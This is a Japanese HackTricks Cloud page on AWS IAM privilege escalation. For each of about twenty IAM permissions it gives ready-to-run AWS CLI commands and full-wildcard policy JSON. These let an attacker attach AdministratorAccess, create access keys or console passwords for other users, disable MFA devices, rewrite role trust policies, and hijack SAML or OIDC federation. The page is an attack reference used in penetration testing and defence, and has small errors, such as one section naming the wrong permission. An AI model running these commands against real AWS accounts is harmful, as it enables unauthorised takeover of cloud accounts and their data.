# AWS - IAM Privesc

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## IAM

IAMについての詳細は以下をチェックしてください:

{% content-ref url="../aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### `iam:CreatePolicyVersion`

**`iam:CreatePolicyVersion`** 権限を持つ攻撃者は、アクセス可能なIAMポリシーの**新しいバージョンを作成**することができます。これにより、**独自のカスタム権限**を定義することができます。新しいポリシーバージョンを作成する際には、それを**デフォルトバージョンとして設定する必要があります**が、`iam:SetDefaultPolicyVersion` 権限が必要だと思われがちです。しかし、新しいポリシーバージョンを作成する際には、自動的にそれを**新しいデフォルトバージョンとして作成する**フラグ（**`--set-as-default`**）を含めることができます。そのフラグを使用するには、`iam:SetDefaultPolicyVersion` 権限は**必要ありません**。

この方法を利用するためのコマンド例は次のようになります:
```bash
# Enum
aws iam list-policy-versions --policy-arn <arn>
aws iam get-policy-version --policy-arn <arn> --version-id <VERSION_X>

# Exploitation
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
`policy.json` ファイルには、**アカウント内の任意のリソースに対して任意のアクションを許可するポリシードキュメント**が含まれています。

**潜在的な影響：** すべてに対する直接的な権限昇格。

### `iam:SetDefaultPolicyVersion`

**`iam:SetDefaultPolicyVersion`** 権限を持つ攻撃者は、**現在使用されていない既存のポリシーバージョンを通じて** 権限を昇格させる可能性があります。攻撃者がアクセスできる**ポリシー**に**デフォルトではないバージョン**がある場合、他の既存のバージョンにデフォルトバージョンを変更することができます。

{% hint style="warning" %}
**ポリシー**のバージョンを**変更**しているのが、攻撃者に`SetDefaultPolicyVersion`権限を**付与**しているのと同じポリシーであり、**新しいバージョンが**その権限を付与しない場合、攻撃者はポリシーを元の状態に**戻すことができなくなります**。
{% endhint %}

この方法を利用する例としてのコマンドは以下のようになります：
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> \
--version-id v2
```
```
v2"は、利用可能な権限が最も多いポリシーのバージョンです。

**潜在的な影響：** より多くの権限を付与する可能性のある異なるポリシーバージョンを設定することによる間接的な権限昇格。

### `iam:CreateAccessKey`

**`iam:CreateAccessKey`** 権限を他のユーザーに対して持つ攻撃者は、AWS環境内の別のユーザーに属するアクセスキーIDとシークレットアクセスキーを**作成することができます**。ただし、それらが既に2セット関連付けられていない場合に限ります（ベストプラクティスによれば、そうあるべきではありません）。

この方法を利用するためのコマンドの例は次のようになります：
```
```bash
aws iam create-access-key --user-name <target_user>
```
対象のユーザーが現在のユーザーよりも拡張された権限セットを持っている場合。

**潜在的な影響：** 任意のユーザーへの直接的な権限昇格。

### `iam:CreateLoginProfile`

`iam:CreateLoginProfile` 権限を他のユーザーに対して持つ攻撃者は、**ログインプロファイルがまだ設定されていない任意のユーザー**に対して、AWSコンソールにログインするための**パスワードを作成**することができます。

この方法を利用するためのコマンドの例は以下のようになります：
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '|[3rxYGGl3@`~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t'
```
そのパスワードは、**アカウントの最小限のパスワード要件**を満たすことを保証します。

**潜在的な影響：** "任意"のユーザーへの直接的な権限昇格。

### `iam:UpdateLoginProfile`

**`iam:UpdateLoginProfile`** 権限を他のユーザーに対して持つ攻撃者は、**すでにログインプロファイルが設定されている**任意のユーザーのAWSコンソールへのログインに使用されるパスワードを**変更**することができます。

ログインプロファイルを作成するのと同様に、この方法を利用するためのコマンドの例は次のようになるかもしれません：
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '|[3rxYGGl3@`~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t'
```
そのパスワードは、**アカウントの最小パスワード要件**を満たすことを保証します。

**潜在的な影響：** 直接的なprivesc "任意"のユーザー。

### `iam:UpdateAccessKey`

**`iam:UpdateAccessKey`** を持つ攻撃者は、**無効にされたアクセスキーを有効にする**ことができ、それを使用することができます（彼は無効にされたアクセスキーを持っている必要があります）

{% code overflow="wrap" %}
```bash
aws iam update-access-key --access-key-id AKIAIOSFODNN7EXAMPLE --status Active --user-name Bob
```
{% endcode %}

**潜在的な影響：** アクセスキーを持つユーザーへの直接的な権限昇格（キーを持っている必要があります）。

### `iam:CreateServiceSpecificCredential`

これにより、リクエストで指定されたサービス（**CodeCommitまたはAmazon Keyspaces** -- Apache Cassandra--）にアクセスするために使用できる**ユーザー名**と**パスワード**を**生成**することができます。

新しいサービス固有の資格情報は、指定されたサービスにのみアクセスすることを除いて、**関連するユーザーと同じ権限**を持っています。

ユーザーごとにサポートされている各サービスに対して、サービス固有の資格情報のセットは**最大で二つまで**可能です。

{% code overflow="wrap" %}
```bash
aws iam create-service-specific-credential --user-name sofia --service-name codecommit.amazonaws.com
```
{% endcode %}

**潜在的な影響：** ユーザーサービス権限への直接的な権限昇格。

### `iam:ResetServiceSpecificCredential`

**`iam:CreateServiceSpecificCredential`** と似ていますが、新しい認証情報を作成する代わりに、既存のものをリセットします。

{% code overflow="wrap" %}
```bash
aws iam reset-service-specific-credential --service-specific-credential-id ACCAEXAMPLE123EXAMPLE
```
{% endcode %}

**潜在的影響：** ユーザーサービス権限への直接的な権限昇格。

### `iam:AttachUserPolicy`

**`iam:AttachUserPolicy`** 権限を持つ攻撃者は、アクセス可能なユーザーにポリシーを**アタッチすることで**、そのポリシーの権限を攻撃者に追加することにより、権限を昇格させることができます。

この方法を利用するためのコマンド例は次のようになります：
```bash
aws iam attach-user-policy --user-name <my_username> \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
**潜在的影響：** 何にでも直接の権限昇格。

### `iam:AttachGroupPolicy`

**`iam:AttachGroupPolicy`** 権限を持つ攻撃者は、自分が属するグループにポリシーを**アタッチする**ことで権限を昇格させることができ、そのポリシーの権限を攻撃者に追加します。
```bash
aws iam attach-group-policy --group-name group_i_am_in \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
グループが現在のユーザーが所属しているグループである場合。

**潜在的な影響：** 直接的な権限昇格が可能です（ユーザーがグループ内にいる場合）。

### `iam:AttachRolePolicy`, ( `sts:AssumeRole`|`iam:createrole`)

**`iam:AttachRolePolicy`** 権限を持つ攻撃者は、アクセス可能なロールにポリシーを**アタッチすることで**権限を昇格させることができ、そのポリシーの権限を攻撃者に追加します。
```bash
aws iam attach-role-policy --role-name <role_i_can_assume> \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
役割が現在のユーザーが `sts:AssumeRole` で一時的に引き受けることができる役割である場合。

**潜在的な影響：** 何にでも直接的なprivesc。

### `iam:PutUserPolicy`

`iam:PutUserPolicy` 権限を持つ攻撃者は、アクセス可能なユーザーのインラインポリシーを作成または更新することで **権限をエスカレーションできます**。これにより、そのポリシーの権限が攻撃者に追加されます。
```bash
aws iam put-user-policy --user-name <my_username> --policy-name "my_inline_policy" \
--policy-document "file:///path/to/administrator/policy.json"
```
ポリシーを使用することができます：
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"*"
],
"Resource": [
"*"
]
}
]
}
```
**潜在的影響：** 何にでも直接的な権限昇格。

### `iam:PutGroupPolicy`

`iam:PutGroupPolicy` 権限を持つ攻撃者は、**自分が所属するグループのインラインポリシーを作成または更新することで**、そのポリシーの権限を攻撃者に追加し、権限を昇格させることができます。
```bash
aws iam put-group-policy --group-name <group_i_am_in> \
--policy-name "group_inline_policy" \
--policy-document file:///path/to/administrator/policy.json
```
グループが**現在のユーザーが所属しているグループ**である場合。

**潜在的な影響：** 何にでも直接的な権限昇格。

### `iam:PutRolePolicy`, (`sts:AssumeRole`|`iam:createrole`)

**`iam:PutRolePolicy`** 権限を持つ攻撃者は、**アクセス可能なロールのインラインポリシーを作成または更新することで**、そのポリシーの権限を攻撃者に追加することにより、権限を昇格させることができます。

この方法を利用するためのコマンドの例は次のようになります：
```bash
aws iam put-role-policy --role-name <role_i_can_assume> \
--policy-name "role_inline_policy" \
--policy-document file:///path/to/administrator/policy.json
```
役割が現在のユーザーが `sts:AssumeRole` で一時的に引き受けることができる役割である場合。

**潜在的な影響：** 何にでも直接的な権限昇格。

### `iam:AddUserToGroup`

**`iam:AddUserToGroup`** 権限を持つ攻撃者は、AWSアカウント内の既存のIAMグループに **自分自身を追加する** ために使用できます。
```bash
aws iam add-user-to-group --group-name <target_group> --user-name <my_username>
```
**target\_groupが攻撃者のユーザーアカウントよりも多くの/異なる権限を持っている場合。**

**潜在的影響：** 任意のグループへの直接的な権限昇格。

### `iam:UpdateAssumeRolePolicy`, `sts:AssumeRole`

`iam:UpdateAssumeRolePolicy` と `sts:AssumeRole` の権限を持つ攻撃者は、**任意の既存のロールのアサムロールポリシードキュメントを変更して**、そのロールを引き受けることができます。
```bash
aws iam update-assume-role-policy --role-name <role_to_assume> \
--policy-document file:///path/to/assume/role/policy.json
```
ポリシーが以下のようになっていて、ユーザーにロールを引き受ける権限を与えている場合：
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**潜在的な影響：** 任意のロールへの直接的な権限昇格。

### `iam:UploadSSHPublicKey`

`iam:DeactivateMFADevice` 権限を持つ攻撃者は、**SSH公開鍵をアップロードし、指定されたIAMユーザーに関連付ける**ことができます（[詳細はこちら](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_UploadSSHPublicKey.html)）。

この操作によってアップロードされたSSH公開鍵は、**関連付けられたIAMユーザーがCodeCommitリポジトリに認証するためにのみ使用できます**。SSH鍵を使用してCodeCommitリポジトリに認証する方法の詳細については、_CodeCommitユーザーガイド_ の [CodeCommitでのSSH接続の設定](https://docs.aws.amazon.com/codecommit/latest/userguide/setting-up-credentials-ssh.html) を参照してください。
```bash
aws iam upload-ssh-public-key --user-name <value> \
--ssh-public-key-body <value>
```
**潜在的な影響：** CodeCommitへの間接的な権限昇格。

### `iam:DeactivateMFADevice`

`iam:DeactivateMFADevice`を持つ攻撃者は、**指定されたMFAデバイスを無効化し**、元々有効にされていたIAMユーザーとの関連付けを解除できます（[詳細を学ぶ](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_DeactivateMFADevice.html)）。
```bash
aws iam deactivate-mfa-device --user-name <value> --serial-number <value>
```
**潜在的影響：** ユーザー名とパスワードを既に知っている場合、MFAデバイスを無効にすることで間接的にprivescを行うことができます。

### `iam:ResyncMFADevice`

`iam:ResyncMFADevice`権限を持つ攻撃者は、指定されたMFAデバイスをIAMエンティティ（ユーザーまたはロール）と**同期**させることができます（[詳細を学ぶ](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_ResyncMFADevice.html)）。
```bash
aws iam resync-mfa-device --user-name <value> --serial-number <value> \
--authentication-code1 <value> --authentication-code2 <value>
```
**潜在的影響：** 既にユーザー名とパスワードを知っている場合、MFAデバイスを追加することで間接的にユーザーの権限を昇格させる。

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

これらの権限を持っていると、**SAML接続のXMLメタデータを変更**することができます。その後、**SAMLフェデレーション**を悪用して、それを信頼している任意の**ロールでログイン**することが可能です。

この操作を行うと、**正規のユーザーはログインできなくなる**ことに注意してください。しかし、XMLを取得できるので、あなたのものを設置し、ログインしてから以前の設定に戻すことができます。
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
{% hint style="info" %}
TODO: 指定されたロールでログインするSAMLメタデータを生成するツール
{% endhint %}

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

(これについては不確かです) 攻撃者がこれらの**権限**を持っている場合、新しい**Thumbprint**を追加して、プロバイダーを信頼するすべてのロールでログインすることができるかもしれません。

{% code overflow="wrap" %}
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
## 参考文献

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
